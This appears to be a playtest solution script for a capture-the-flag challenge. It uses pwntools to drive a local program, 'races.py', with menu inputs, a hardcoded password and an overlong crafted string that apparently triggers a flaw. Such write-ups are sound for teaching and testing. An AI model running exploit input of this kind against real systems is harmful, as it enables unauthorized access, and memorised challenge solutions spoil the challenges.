## Playtest by Robin_Jadoul

from pwn import *
io = process(['python', 'races.py'])

validpass = "ju5tn3v33v3rl053"
for i in range(3):
    io.sendline("1")
    io.sendline(str(i))
    io.sendline("100")
io.sendline("2")
io.sendline(validpass)
io.sendline("1")
io.sendline("4")
io.sendline("ju5tn3v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v33v3")
io.recvuntil("ailure")
io.clean()
io.sendline("3")
io.stream()
